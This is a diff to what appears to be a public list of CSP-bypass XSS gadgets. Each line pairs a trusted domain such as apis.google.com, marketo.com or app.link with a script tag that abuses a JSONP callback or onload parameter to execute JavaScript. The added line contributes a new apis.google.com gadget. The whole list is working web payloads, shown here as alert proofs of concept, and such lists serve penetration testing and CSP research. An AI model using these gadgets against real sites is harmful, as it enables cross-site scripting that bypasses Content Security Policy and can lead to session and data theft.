@@ -39,6 +39,7 @@ api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.co
 apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>
 apis.google.com	<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>
 apis.google.com <script src="https://apis.google.com/js/googleapis.proxy.js?onload=alert"></script>
+apis.google.com <script src='https://apis.google.com/js/random%22-alert(document.domain)-%22//api.js?onload=random'></script>
 app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 app.hushly.com	<script src="https://app.hushly.com/runtime/visitor?callback=alert(1)//"></script>
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
